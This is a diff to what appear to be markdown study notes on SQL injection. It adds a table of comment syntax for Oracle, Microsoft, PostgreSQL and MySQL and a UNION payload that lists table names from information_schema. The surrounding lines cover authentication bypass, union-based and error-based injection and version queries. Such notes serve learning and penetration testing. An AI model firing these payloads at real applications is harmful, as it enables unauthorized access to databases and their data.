@@ -34,7 +34,14 @@ SQL injection login Authentication bypass is due to backend code logic issue.
 
 Report: User authentication bypass using SQL injection
 
-Use -- or # for comment in SQL
+### Comments
+
+| DBMS           | Syntex      |
+| -------------- | ----------- |
+| **Oracle**     | --          |
+| **Microsoft**  | --, /**/    |
+| **PostgreSQL** | --, /**/    |
+| MySQL          | #, --, /**/ |
 ### Union Base SQL Injection:
 When results show on web page like product list page, we need to test the union base SQL injection
 - Add `'` quote to inject
@@ -68,7 +75,10 @@ Oracle
 ' SELECT NULL, banner FROM v$version
 ```
 
-
+Finding table names
+```
+' UNION SELECT table_name, NULL FROM information_schema.tables --
+```
 ### Error base SQL injection
 It is a technique if SQL injection vulnerability exists or not.
 It errors shows any info related to SQL query or version or response
